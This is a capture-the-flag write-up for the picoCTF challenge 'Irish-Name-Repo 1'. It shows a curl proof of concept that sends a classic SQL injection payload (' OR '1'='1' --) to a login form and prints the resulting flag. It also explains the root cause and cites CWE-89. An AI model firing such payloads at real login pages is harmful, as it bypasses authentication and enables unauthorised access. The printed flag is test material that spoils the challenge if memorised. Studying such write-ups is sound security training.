# Irish-Name-Repo 1

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{s0m3_SQL_85832275}`

## Summary

An admin login form (`login.php`) is vulnerable to a textbook, unfiltered SQL injection
authentication bypass — no denylist, no escaping, no rate limiting.

## Discovery

`login.html` posts `username`, `password`, and a hidden `debug=0` field to `login.php`. Nothing
in the page suggests any input filtering.

## Proof of Concept

```
curl -s -X POST "http://TARGET/login.php" \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=x" \
  --data-urlencode "debug=0"
```

```
Logged in! Your flag is: picoCTF{s0m3_SQL_85832275}
```

The injected username closes the query's string literal and appends an always-true condition
(`'1'='1'`), commenting out the rest of the WHERE clause (including the password check) with
`--`, so the query returns the first row in the users table regardless of credentials.

## Root Cause

User input concatenated directly into a SQL query with no parameterization or sanitization.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **OWASP A03:2021**: Injection
